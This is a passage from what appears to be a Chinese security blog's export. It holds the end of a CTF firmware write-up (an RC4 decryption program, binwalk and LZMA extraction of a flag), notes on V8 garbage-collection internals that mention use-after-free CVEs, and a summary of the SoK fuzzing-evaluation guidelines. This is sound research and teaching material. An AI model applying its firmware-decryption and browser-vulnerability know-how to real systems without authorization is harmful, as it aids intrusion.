class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *mode = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *input_filename = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *output_filename = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)argv[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> keylen = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)key);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> length;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *input_data = read_file(input_filename, &amp;length);</span><br><span class="line">    <span class="keyword">if</span> (!input_data) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *output_data = <span class="built_in">malloc</span>(length);</span><br><span class="line">    <span class="keyword">if</span> (!output_data) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(input_data);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RC4_Context ctx;</span><br><span class="line">    RC4_Init(&amp;ctx, key, keylen);</span><br><span class="line">    RC4_Crypt(&amp;ctx, input_data, output_data, length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(output_filename, output_data, length)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;写入输出文件失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(input_data);</span><br><span class="line">        <span class="built_in">free</span>(output_data);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s 成功: %s -&gt; %s\n&quot;</span>, <span class="built_in">strcmp</span>(mode, <span class="string">&quot;encrypt&quot;</span>) == <span class="number">0</span> ? <span class="string">&quot;加密&quot;</span> : <span class="string">&quot;解密&quot;</span>, input_filename, output_filename);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(input_data);</span><br><span class="line">    <span class="built_in">free</span>(output_data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解压后使用binwalk查看目标文件，发现lzma压缩，解压缩：</p>
<img src="/posts/33a951e6/file-20250801152948544.png" class="">
<p>查看字符串即可得到明文存储的flag：</p>
<img src="/posts/33a951e6/file-20250801153106715.png" class="">

<h2 id="扩展：能否不用map文件解题"><a href="#扩展：能否不用map文件解题" class="headerlink" title="扩展：能否不用map文件解题"></a>扩展：能否不用map文件解题</h2><p>map文件的作用有两个：</p>
<ol>
<li>获取固件基地址（已解决）</li>
<li>获取函数符号地址（已解决）</li>
<li>获取库函数名字（可以猜测）<br>第一个问题解决方法：发现内部字符串是有符号地址定义的，因此可以推导出固件基地址；<br>第二个问题解决方法：全部反汇编即可；<br>第三个问题解决方法：基于语义理解。</li>
</ol>
<h3 id="flash-bin固件格式解析"><a href="#flash-bin固件格式解析" class="headerlink" title="flash bin固件格式解析"></a>flash bin固件格式解析</h3><p>通过hiburn工具可以导出flash内存中的内容<br>似乎每个分区会以HNV$字符串作为结束</p>
<img src="/posts/33a951e6/file-20250802161556551.png" class="">
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://device.harmonyos.com/cn/docs/documentation/guide/service_introduction-0000001050166905">HUAWEI DevEco Device Tool使用指南</a></li>
<li><a href="https://developer.huawei.com/consumer/cn/forum/topic/0202130181744663035">hi3861_hdu_iot@1.0.0和DevTools_Hi3861V100@1.0.0安装失败</a></li>
<li><a href="https://developer.huawei.com/consumer/cn/forum/topic/0203135943888580277">DevTools_Hi3861V100_v1.0.zip 下载不了</a></li>
<li><a href="https://bbs.kanxue.com/thread-281043.htm">[原创]常见的固件加解密方式与D-Link固件解密实战分析</a></li>
<li><a href="https://gitee.com/openharmony/update_ota_lite">OpenHarmony OTA</a></li>
<li><a href="https://docs.openharmony.cn/pages/v5.0/zh-cn/device-dev/subsystems/subsys-ota-guide.md">子系统开发-OTA升级</a></li>
<li><a href="https://gitee.com/openharmony/update_packaging_tools">升级包制作工具</a></li>
<li><a href="https://developer.huawei.com/consumer/cn/forum/topic/0203380603429100381?fid=0101587866109860105">如何在HI3861开发板使用官方示例工程中的shell？</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>V8内存回收机制</title>
    <url>/posts/f020ea55.html</url>
    <content><![CDATA[<h2 id="V8内存回收机制"><a href="#V8内存回收机制" class="headerlink" title="V8内存回收机制"></a>V8内存回收机制</h2><h3 id="V8-采用的垃圾回收算法（2019年）"><a href="#V8-采用的垃圾回收算法（2019年）" class="headerlink" title="V8 采用的垃圾回收算法（2019年）"></a>V8 采用的垃圾回收算法（2019年）</h3><p><strong>内存回收机制的基本组成部分</strong></p>
<ol>
<li>识别存活&#x2F;已死亡对象</li>
<li>回收死亡对象的内存</li>
<li>整合分片化内存（可选）</li>
</ol>
<p>v8垃圾回收机制分为<strong>Major GC</strong>和<strong>Minor GC</strong>两种内存回收器</p>
<ul>
<li>Major GC：Mark Compact（针对整个堆空间）</li>
<li>Minor GC：<strong>Scavenge</strong> &amp; Minor Mark Sweep（针对新生代）</li>
</ul>
<h4 id="Major-GC-Full-Mark-Compact"><a href="#Major-GC-Full-Mark-Compact" class="headerlink" title="Major GC (Full Mark-Compact)"></a>Major GC (Full Mark-Compact)</h4><p>major gc负责从整个堆内存中回收垃圾内存。</p>
<img src="/posts/f020ea55/image-20250716132400706.png" class="" title="image-20250716132400706">

<p>上图为最简单的版本，将Major GC 分为三个阶段: marking, sweeping和compacting，存在很大的延迟，影响性能。</p>
<h5 id="Marking"><a href="#Marking" class="headerlink" title="Marking"></a>Marking</h5><p>通过可达性判断对象是否存活（可达：当前运行状态可引用的对象；不可达：其他所有不被引用对象）<br>首先从已知对象指针根集合（执行栈、全局对象）开始查找指针对应对象并将其标记为可达，然后递归遍历。<br>V8使用三色标记法来标记对象，每个对象通过两个标记位和一个标记列表来实现标记，两个标记为标识三种颜色：白色（00）、灰色（10）和黑色（11）。最初所有对象都是白色，当垃圾回收器发现白色物体并将其推送到标记列表时，它会变成灰色。当收集器从标记工作列表弹出对象并访问其所有字段时，灰色对象变为黑色。当不再有灰色对象时，标记完成，所有剩余白色物体都无法到达，可以安全地回收。</p>
<h6 id="三色标记法"><a href="#三色标记法" class="headerlink" title="三色标记法"></a>三色标记法</h6><ul>
<li>黑色表示正在使用的对象，不能回收</li>
<li>灰色表示通过黑色对象可以被访问的对象，需要加入worklist；在worklist的对象会在下一次迭代中标记为黑色</li>
<li>白色表示在当前状态下，不能被访问到的对象<br>GC算法标记结束后，白色对象将被释放。当前漏洞成因是一个能够被访问到的对象在GC算法结束时，被错误地标记为白色，导致被释放，出现UAF。<img src="/posts/f020ea55/1658369227_62d8b4cb4969f287b16a4.jpeg" class="" title="img"></li>
</ul>
<h5 id="Sweeping"><a href="#Sweeping" class="headerlink" title="Sweeping"></a>Sweeping</h5><p>将死亡对象（不可达对象）添加到free-lists。每一段内存区域对应一个free-list，方便后续查找死亡对象进行释放以及重新申请内存。</p>
<h5 id="Compaction"><a href="#Compaction" class="headerlink" title="Compaction"></a>Compaction</h5><p>major gc在此阶段根据该内存页的分片情况选择是否进行Compact。<br>Compact策略是将分片比较严重的内存页中的存活对象复制到其他内存页，从而保证该内存页仅剩死亡对象，方便后续的内存回收。<br>弊端：需要复制大量的存活对象，因此仅当内存页分片比较严重时才会这样做。其他情况则仅做sweeping操作。</p>
<a href="/posts/f020ea55.html" title="V8内存回收机制">Major GC源码分析</a>
<h4 id="Minor-GC-Scavenger"><a href="#Minor-GC-Scavenger" class="headerlink" title="Minor GC (Scavenger)"></a>Minor GC (Scavenger)</h4><h5 id="Generational-layout"><a href="#Generational-layout" class="headerlink" title="Generational layout"></a>Generational layout</h5><p>V8中的堆内存被分为不同的区域，称为“generations”。分为新生代（young generation，分为nursery和intermediate）和老生代（old generation）。<br>初始申请对象的堆内存时，将其申请在nursery空间。如果在下一次GC后，该对象仍然标记为存活，则将其<strong>移动</strong>到intermediate区域。如果再一次GC后，该对象仍然存活，则将其<strong>移动</strong>到老生代区域。（基于大部分申请对象的存活周期都比较短的现象）。</p>
<img src="/posts/f020ea55/image-20250725101812681.png" class="" title="image-20250725101812681">
<h5 id="Cheney’s-Semispace-Copy"><a href="#Cheney’s-Semispace-Copy" class="headerlink" title="Cheney’s Semispace Copy"></a>Cheney’s Semispace Copy</h5><p>分为三步（Marking，Evacuating，Pointer-updating）<br>每次gc后存活对象会被迁移到新的内存页。使用”semi-space”设计，一半为全空（<strong>To-Space，intermediate</strong>），另一半为Nursery区域（<strong>From-Space</strong>）。<br>在scavenge过程中，需要额外维护一个根集合（<strong>Old-to-young generation references：老生代的指针引用新生代的对象</strong>）。使用remebered set、write-barriers来维护该集合。</p>
<blockquote>
<p>When combined with the stack and globals, we know every reference into the young generation, without the need to trace through the entire old generation.</p>
</blockquote>
<img src="/posts/f020ea55/image-20250725110934202.png" class="" title="image-20250725110934202">

<p><strong>Marking</strong>：以调用栈以及old-to-young generation reference作为根集合开始递归搜索并移动。<br><strong>Evacuation</strong>：将所有存活对象移动到一段连续内存，可以解决内存分片的问题。然后将两个空间翻转重新开始下一轮gc。</p>
<img src="/posts/f020ea55/v2-cb93f4308120513a9ddea5b6b677d0f4_1440w.jpg" class="" title="img">
<p>两轮都存活则移动到old-space。<br><strong>Pointer-Updating：</strong> 最后更新指向移动过的对象的指针。每一个拷贝的对象都会遗留一个forwarding-address来更新原指针指向新地址。</p>
<a href="/posts/f020ea55.html" title="V8内存回收机制">Minor GC源码分析</a>
<h5 id="Write-barriers"><a href="#Write-barriers" class="headerlink" title="Write-barriers"></a>Write-barriers</h5><img src="/posts/f020ea55/image-20250725133621329.png" class="" title="image-20250725133621329">
<p>具体见[[2025-07-25-Write Barrier.md|Write-barriers]]</p>
<h5 id="parallel-Mark-Evacuate（Since-V6-2）"><a href="#parallel-Mark-Evacuate（Since-V6-2）" class="headerlink" title="parallel Mark-Evacuate（Since V6.2）"></a>parallel Mark-Evacuate（Since V6.2）</h5><p>基于Major GC的Mark-Sweep-Compact垃圾回收器实现。分为三步（Marking， Copying，Updating pointers）<br>没有使用sweep机制，仍然使用semispace机制来保证compact特性。<br>分为多个线程，分别负责一段内存区域；每一个阶段完成进入下一阶段前需要进行线程间同步。</p>
<h5 id="parallel-Scavenge"><a href="#parallel-Scavenge" class="headerlink" title="parallel Scavenge"></a>parallel Scavenge</h5><p>将parallel Mark-Evacuate的三个阶段合并起来，每个内存页维护remembered set。对象并行处理，新发现的对象被添加到global work list用于gc线程处理。<strong>write barrier确保了当前处理对象不适合gc处理时，不会过早终止</strong><br>parallel Mark Evacuate与parallel Scavenge的区别见：[[2025-07-25-parallel Mark-Evaculate vs parallel Scavenge|Parallel Mark-Evaculate vs Parallel Scavenge]]</p>
<h4 id="Orinoco-Google-GC项目名称"><a href="#Orinoco-Google-GC项目名称" class="headerlink" title="Orinoco(Google GC项目名称)"></a>Orinoco(Google GC项目名称)</h4><p>介绍了一些gc里面的名词</p>
<h5 id="Parallel"><a href="#Parallel" class="headerlink" title="Parallel"></a>Parallel</h5><p>主线程与其他工作线程一起完成gc工作：</p>
<img src="/posts/f020ea55/image-20250725120056908.png" class="" title="image-20250725120056908">

<h5 id="Incremental"><a href="#Incremental" class="headerlink" title="Incremental"></a>Incremental</h5><p>分为多个小阶段</p>
<img src="/posts/f020ea55/image-20250725120112932.png" class="" title="image-20250725120112932">

<h5 id="Concurrent"><a href="#Concurrent" class="headerlink" title="Concurrent"></a>Concurrent</h5><p>交由工作线程处理，等结果返回后交付给主线程处理</p>
<img src="/posts/f020ea55/image-20250725120137746.png" class="" title="image-20250725120137746">

<h3 id="垃圾回收机制的创新，哪些时候引入的"><a href="#垃圾回收机制的创新，哪些时候引入的" class="headerlink" title="垃圾回收机制的创新，哪些时候引入的"></a>垃圾回收机制的创新，哪些时候引入的</h3><h5 id="Jank-Busters-Part-One（2015）"><a href="#Jank-Busters-Part-One（2015）" class="headerlink" title="Jank Busters Part One（2015）"></a>Jank Busters Part One（2015）</h5><p>原始版本：Chrome 41 -&gt; 46<br>优化前：</p>
<img src="/posts/f020ea55/image-20250725140000815.png" class="" title="image-20250725140000815">

<p>优化后：</p>
<img src="/posts/f020ea55/image-20250725140054451.png" class="" title="image-20250725140054451">

<h4 id="Jank-Busters-Part-Two（2016）"><a href="#Jank-Busters-Part-Two（2016）" class="headerlink" title="Jank Busters Part Two（2016）"></a>Jank Busters Part Two（2016）</h4><p><strong>优化1</strong>：实现 <a href="https://en.wikipedia.org/wiki/Garbage_collection_(computer_science)#Generational">generational garbage collector</a>parallel处理。<br>优化前：</p>
<img src="/posts/f020ea55/sequential.png" class="" title="img">
<p>优化后：</p>
<img src="/posts/f020ea55/parallel.png" class="" title="img">

<p><strong>优化2</strong>：更新了跟踪指针方式（rememberd set），改变指针方向，避免指针重复以及race。</p>
<img src="/posts/f020ea55/old-remembered-set.png" class="" title="img">

<img src="/posts/f020ea55/new-remembered-set.png" class="" title="img">

<p><strong>优化3</strong>：black allocation（Since V8 5.1），对垃圾回收的标记阶段的提升，所有位于old generations的对象都被标记为黑色，表示该对象为存活对象，对应三色标记法。</p>
<ul>
<li>可以直接申请到black page上；</li>
<li>无需sweep；</li>
<li>加速了incremental marking，因为通过black allocation的不会增加其工作量；</li>
</ul>
<h4 id="State-of-GC-in-V8"><a href="#State-of-GC-in-V8" class="headerlink" title="State of GC in V8"></a>State of GC in V8</h4><h5 id="Scavenging"><a href="#Scavenging" class="headerlink" title="Scavenging"></a>Scavenging</h5><p>parallel scavenging</p>
<img src="/posts/f020ea55/image-20250725120245083.png" class="" title="image-20250725120245083">

<h5 id="Major-GC"><a href="#Major-GC" class="headerlink" title="Major GC"></a>Major GC</h5><p>concurrent Marking，concurrent Sweeping &#x2F; parallel compaction + pointer updating</p>
<img src="/posts/f020ea55/image-20250725120317877.png" class="" title="image-20250725120317877">

<h5 id="Idle-time-GC"><a href="#Idle-time-GC" class="headerlink" title="Idle-time GC"></a>Idle-time GC</h5><p>空闲时间gc</p>
<img src="/posts/f020ea55/image-20250725120350598.png" class="" title="image-20250725120350598">

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>源码位置在<code>//v8/src/heap/</code>目录下。<br>需要关注分析的文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some basic utils</span></span><br><span class="line">heap.cc -&gt; heap definition</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">minor gc</span></span><br><span class="line">scavenger.cc -&gt; minor gc scavenger</span><br><span class="line">minor-mark-sweep.cc -&gt; minor gc mark sweep</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">major gc</span></span><br><span class="line">mark-compact.cc -&gt; major gc mark compact</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some techniques</span></span><br><span class="line">evacuation-allocator.cc -&gt; minor gc evacuation</span><br><span class="line">incremental-marking.cc -&gt; incremental-marking</span><br></pre></td></tr></table></figure>

<p><code>GarbageCollector</code>类定义<code>//v8/src/heap/heap.cc</code></p>
<img src="/posts/f020ea55/image-20250715215021268.png" class="" title="image-20250715215021268">
<p>选择GarbageCollector函数<code>Heap::SelectGarbageCollector</code>，<code>//v8/src/heap/heap.cc</code></p>
<img src="/posts/f020ea55/image-20250715214723482.png" class="" title="image-20250715214723482">

<h4 id="Mark-Compact"><a href="#Mark-Compact" class="headerlink" title="Mark-Compact"></a>Mark-Compact</h4><p>CollectGarbage函数（<code>//v8/src/heap/mark-compact.cc</code>），包含基本流程：<br>![[2025-07-14-V8内存回收机制&#x2F;file-20250725163835844.png]]</p>
<ul>
<li>Mark相关函数，详见：<a href="/posts/6e869f39.html" title="Mark Compact: Mark功能解析">Mark Compact: Mark</a></li>
<li>Sweep相关函数，详见：<a href="/posts/61a1b815.html" title="Mark Compact Sweep">Mark Compact: Sweep</a></li>
<li>Evacuate相关函数，详见：<a href="/posts/b7b540c5.html" title="Mark Compact: Evacuate">Mark Compact: Evacuate</a></li>
<li>Finish函数：收尾工作，将延迟释放的释放掉，以及释放申请的资源等。</li>
</ul>
<h4 id="Scavenger"><a href="#Scavenger" class="headerlink" title="Scavenger"></a>Scavenger</h4><p>CollectGarbage函数（<code>//v8/src/heap/scavenger.cc</code>），包含基本流程（swap semispace, iterate marking, promote, update）：<br>该函数详见：<a href="/posts/e5c6daaf.html" title="Scavenger CollectGarbage">Scavenger CollectGarbage</a></p>
<h4 id="Mark-Sweep"><a href="#Mark-Sweep" class="headerlink" title="Mark-Sweep"></a>Mark-Sweep</h4><p>CollectGarbage函数（<code>//v8/src/heap/minor-mark-sweep.cc</code>），包含基本流程：<br>![[2025-07-14-V8内存回收机制&#x2F;file-20250726143701519.png]]</p>
<ul>
<li>MarkLiveObjects函数：与Mark Compact的MarkLiveObject函数类似，但更关注于Young Generation对象。</li>
<li>Sweep函数：sweep+update</li>
</ul>
<h3 id="历史漏洞分析"><a href="#历史漏洞分析" class="headerlink" title="历史漏洞分析"></a>历史漏洞分析</h3><h4 id="Chrome-V8漏洞（CVE-2021-37975）分析"><a href="#Chrome-V8漏洞（CVE-2021-37975）分析" class="headerlink" title="Chrome V8漏洞（CVE-2021-37975）分析"></a>Chrome V8漏洞（CVE-2021-37975）分析</h4><p>详细分析见：<a href="/posts/4a198a52.html" title="CVE-2021-37975复现">CVE-2021-37075复现</a></p>
<h4 id="Chrome-V8漏洞（CVE-2022-1310）分析"><a href="#Chrome-V8漏洞（CVE-2022-1310）分析" class="headerlink" title="Chrome V8漏洞（CVE-2022-1310）分析"></a>Chrome V8漏洞（CVE-2022-1310）分析</h4><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://v8.dev/blog/trash-talk">Trash talk: the Orinoco garbage collector</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/688350947">[V8引擎]内存管理和垃圾回收(GC)</a></li>
<li><a href="https://v8.dev/blog/jank-busters">jank-busters</a></li>
<li><a href="https://v8.dev/blog/orinoco">orinoco</a></li>
<li><a href="https://v8.dev/blog/orinoco-parallel-scavenger">Orinoco: young generation garbage collection</a></li>
<li><a href="https://www.freebuf.com/vuls/339684.html">Chrome V8命令执行漏洞（CVE-2022-1310）分析</a></li>
<li><a href="https://bbs.kanxue.com/thread-281657.htm">[原创]chrome v8漏洞CVE-2021-37975浅析</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Sok论文阅读</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p><strong>题目</strong>：SoK: Prudent Evaluation Practices for Fuzzing  </p>
<p><strong>期刊&#x2F;会议</strong>：2024 IEEE Symposium on Security and Privacy (SP)  </p>
<p><strong>作者</strong>：Moritz Schloegel  （CISPA）</p>
<h2 id="论文简介"><a href="#论文简介" class="headerlink" title="论文简介"></a>论文简介</h2><p>对2018到2023年的有关fuzz的论文（150篇A类期刊）进行了总结，并且提出需要有一个更加精确谨慎的评估方法，确保成果工作的可重复性，可验证性</p>
<blockquote>
<p>These case studies allow us to assess the practical reproducibility of fuzzing research and identify archetypal pitfalls in the evaluation design. Unfortunately, our reproduced results reveal several deficiencies in the studied papers, and we are unable to fully support and reproduce the respective claims. To help the field of fuzzing move toward a scientifically reproducible evaluation strategy, we propose updated guidelines for conducting a fuzzing evaluation that future work should follow.  </p>
<p>In 2018, the first and most influential paper describing a reproducible evaluation design was published by Klees et al. [88]  (仅仅重复多次是不现实的，因为耗时，成本较高)</p>
</blockquote>
<p>注：选取的期刊&#x2F;会议（S&amp;P，USENIX，CCS，NDSS；ASE，ESEC&#x2F;FSE，ICSE）</p>
<h2 id="研究内容"><a href="#研究内容" class="headerlink" title="研究内容"></a>研究内容</h2><p>总结近年来fuzzing工作的不足以及有益的地方；对fuzzing论文关注以下几点：</p>
<ul>
<li>系统性地分析实验评估工作是怎么做的（metrics，targets，baselines，reported bugs）</li>
<li>检查常用的准则（业内普遍共识），例如Klee提出的或者其他业内普遍准则（不使用人造数据集）</li>
<li>影响评估工作确定性&#x2F;稳定性的潜在缺陷</li>
</ul>
<p>复现8篇不同领域的相关工作，并指出复现过程中存在问题和不足（<a href="https://github.com/fuzz-evaluator/">复现工作</a>）</p>
<p>提供了<a href="https://github.com/fuzz-evaluator/guidelines">guideline</a></p>
<p><strong>对于实验评估的Guideline：</strong></p>
<ul>
<li>Baseline：与相关的工作进行对比，查看提升</li>
<li>Targets：对相关的样本做测试，需要有已知漏洞的作为benchmark数据的ground truth</li>
<li>Setup &amp; Parameters：fuzz本身的随机性，需要长时间fuzz（24小时），需要有一个按时间的plot表；种子需要有较好格式</li>
<li>Evaluation Metrics：以漏洞发现能力为主，以代码覆盖率为第二个</li>
<li>Statistics Evaluation：使用统计学检验（检验零假设。。。）</li>
</ul>
<p><strong>对于FuzzBench的Guideline</strong>：</p>
<ul>
<li>fuzzer的表现与初始化种子影响较大。仅当fuzzer可以处理比较、分支情况时才可以无种子来跑。</li>
<li>不建议使用饱和语料库进行模糊测试，因为体现不到fuzzer的优势</li>
</ul>
<p><strong>对于覆盖率可靠性的Guideline</strong>：</p>
<ul>
<li>至少10个程序，12小时（作者推荐double）</li>
<li>目标应该是实际程序。</li>
</ul>
<h2 id="研究成果"><a href="#研究成果" class="headerlink" title="研究成果"></a>研究成果</h2><p>放一下其给出的guidelines</p>
<h3 id="Fuzzing-Evaluation-Guidelines"><a href="#Fuzzing-Evaluation-Guidelines" class="headerlink" title="Fuzzing Evaluation Guidelines"></a>Fuzzing Evaluation Guidelines</h3><p><strong>Current version</strong>: 1.0.3</p>
<p>Proposals for changes welcome (please open an issue for discussion or a pull request for changes).</p>
<p><strong>DISCLAIMER</strong>: These items represent are a best-effort attempt at capturing action items to follow during the evaluation of a scientific paper that focuses on fuzzing. <strong>They do not apply universally to all fuzzing methods - in certain scenarios, techniques may wish to deviate for good reason from these guidelines. In any case, a case-by-case judgment is necessary.</strong> The guidelines do not discuss many malicious choices that immediately negate any chance of a fair evaluation, such as giving your fuzzer an unfair advantage (e.g., by fine-tuning the fuzzer or its targets) or putting other fuzzers at a disadvantage.</p>
<p>A. Preparation for Evaluation</p>
<ol>
<li><p>Find relevant tools and baselines to compare against</p>
<ul>
<li>1.1 Include state-of-the-art techniques from both academia and industry</li>
<li>1.2 If your fuzzer is based on an existing fuzzer, include the baseline (to measure the delta of your changes, which allows attributing improvements to your technique)</li>
<li>1.3 Use recent versions of fuzzers</li>
<li>1.4 If applicable, derive a baseline variant of your technique that replaces core contributions by alternatives. For example, consider using a variant that replaces an informed algorithm with randomness.</li>
<li>1.5 If using AFL-style fuzzers, do not use afl-gcc but afl-clang-fast or afl-clang-lto.</li>
</ul>
</li>
<li><p>Identify suitable targets for the evaluation</p>
<ul>
<li>2.1 If applicable, consider using evaluation benchmarks, such as Fuzzbench (this allows to test many fuzzers under standardized conditions)</li>
<li>2.2 Select a representative set of programs from the target domain</li>
<li>2.3 Include targets used by related work (for comparability reasons)</li>
<li>2.4 Do not cherry-pick targets based on preliminary results</li>
<li>2.5 Do not pick multiple targets that share a considerable amount of code (e.g., two wrappers for the same library)</li>
<li>2.6 Do not use artificial programs or programs with artificially injected bugs</li>
</ul>
</li>
<li><p>Derive suitable experiments to evaluate your approach</p>
<ul>
<li><p>3.1 Evaluate on found bugs (if applicable)</p>
<ul>
<li><p>3.1.1 If using</p>
<p>new</p>
<p>bugs,</p>
<ul>
<li>3.1.1.1 include whether other fuzzers find the bug as well (so you can attribute finding this bug to your technique rather than being the first to fuzz this target); other fuzzers must have had the same computing resources</li>
<li>3.1.1.2 deduplicate crashing inputs to derive the true bug count<ul>
<li>3.1.1.2.1 If possible, use vendor confirmation to identify true bugs</li>
<li>3.1.1.2.2 Otherwise use manual triaging (consider automated deduplication as a pre-step to reduce number of findings)</li>
</ul>
</li>
<li>3.1.1.3 do not fuzz unsuitable programs for the sake of finding bugs (e.g., small hobby projects that are no longer maintained are not suitable)</li>
<li>3.1.1.4 do not search for bugs in unstable, fast moving development branches, but prefer stable&#x2F;release versions</li>
</ul>
</li>
<li><p>3.1.2 If using</p>
<p>known</p>
<p>bugs,</p>
<ul>
<li>3.1.2.1 use the known bugs as ground truth</li>
<li>3.1.2.2 take into account that known bugs may not have been deduplicated</li>
<li>3.1.2.3 do not evaluate on artificial bugs</li>
</ul>
</li>
<li><p>3.1.3 Do not use the number of (unique) crashing inputs as bug count</p>
</li>
</ul>
</li>
<li><p>3.2 Evaluate code coverage over time (if applicable)</p>
<ul>
<li>3.2.1 If possible, use source code-based coverage (e.g., llvm-cov or lcov)</li>
<li>3.2.2 Otherwise use a collision-free encoding</li>
<li>3.2.3 Measure coverage on a neutral binary; this binary should include only instrumentation needed to measure the coverage, but not sanitizers or fuzzer-specific instrumentation</li>
<li>3.2.4 If using dynamic binary translation, the coverage measurement should be independent of the translation (e.g., emulators may split a basic block into multiple translation blocks, disturbing measurements)</li>
</ul>
</li>
<li><p>3.3 If applicable, evaluate domain-specific aspects of your fuzzer</p>
</li>
<li><p>3.4 If applicable, conduct ablation studies to measure individual design choices</p>
</li>
<li><p>3.5 If applicable, evaluate the influence of hyperparameters on your design</p>
</li>
<li><p>3.6 If doing experiments using custom metrics,</p>
<ul>
<li>3.6.1 take special care to ensure a fair comparison to existing work.</li>
<li>3.6.2 In particular, avoid queue survivor bias (i.e., the queue only contains input fulfilling specific criteria) as it may favor your fuzzer. For example, your fuzzer optimizing towards the new, custom metric may keep inputs in the queue that others discard (even though they find the input at runtime) – evaluating only inputs on the queue thus gives your fuzzer an unfair advantage.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>B. Documenting the Evaluation</p>
<ol>
<li>Describe the setup, including<ul>
<li>1.1 hardware used (such as CPU and RAM)</li>
<li>1.2 how many cores have been available to each fuzzing campaign (e.g., via CPU pinning)</li>
<li>1.3 technologies used, such as Docker or virtualization</li>
</ul>
</li>
<li>Choose and document experiment parameters, including<ul>
<li>2.1 a sufficiently long runtime (if possible &gt;&#x3D; 24h)</li>
<li>2.2 a sufficient number of repetitions&#x2F;trials to account for randomness and enable a robust statistical evaluation (if possible &gt;&#x3D; 10 trials)</li>
<li>2.3 fairness of computing resource allocation, i.e., all fuzzers have access to the same amount of computation resources. This requires particular consideration if a tool requires pre-computation(s).</li>
<li>2.4 suitable seeds:<ul>
<li>2.4.1 If possible, use uninformed seeds for coverage evaluation (for bug experiments, informed seeds may be beneficial)</li>
<li>2.4.2 Otherwise identify the coverage achieved by the initial seed set</li>
<li>2.4.3 Provide all fuzzers with the same set of seeds</li>
<li>2.4.4 Publish the used set of seeds</li>
</ul>
</li>
<li>2.5 targets:<ul>
<li>2.5.1 Use recent versions</li>
<li>2.5.2 If applicable, explain modifications to the programs or runtime environment (e.g., when you patch the program or set a lower stack size)</li>
</ul>
</li>
<li>2.6 other tools&#x2F;fuzzers:<ul>
<li>2.6.1 Use recent versions</li>
<li>2.6.2 If your fuzzer is based on another one, make sure the version you base your tool on and the one used in the evaluation are the same</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>C. Experiment Postprocessing</p>
<ol>
<li>Data Analysis<ul>
<li>1.1 Run a robust statistical evaluation to measure significance, such as Mann-Whitney U or bootstrap-based methods</li>
<li>1.2 Measure effect size using a test such as the Vargha and Delaney A^_{12} test</li>
</ul>
</li>
<li>Data Visualization<ul>
<li>2.1 If applicable, plot absolute values (such as for coverage over time)</li>
<li>2.2 Measure uncertainty, for example using standard deviation or (confidence) intervals in plots</li>
</ul>
</li>
<li>Bug Handling<ul>
<li>3.1 Deduplicate and triage crashing inputs</li>
<li>3.2 Report new bugs<ul>
<li>3.2.1 Follow responsible disclosure guidelines</li>
<li>3.2.2 If possible, minimize samples before reporting</li>
<li>3.2.3 If possible, attach available information, such as precise environment (OS, compilation flags, command line arguments, …), ASAN reports, and (minimized) crashing input</li>
<li>3.2.4 Consider reporting the bug with an anonymous identity and link to it in the paper during submission, such that reviewers can assess the bug and its impact themselves</li>
</ul>
</li>
<li>3.3 CVEs<ul>
<li>3.3.1 CVEs should be requested by maintainers</li>
<li>3.3.2 If the maintainers do not request a CVE, link to the bug tracker instead of requesting a CVE yourself</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>D. Artifact Release</p>
<ol>
<li>Artifact Contents<ul>
<li>1.1 Publish your code on a platform ensuring long-term availability, such as Zenodo or GitHub</li>
<li>1.2 Publish modifications of other tools<ul>
<li>1.2.1 If modifying other tools, publish any modifications</li>
<li>1.2.2 Publish your integration of other tools</li>
</ul>
</li>
<li>1.3 If possible, publish experiment data</li>
</ul>
</li>
<li>Artifact Documentation<ul>
<li>2.1 Document how to build your fuzzer</li>
<li>2.2 Document how to interact with your fuzzer</li>
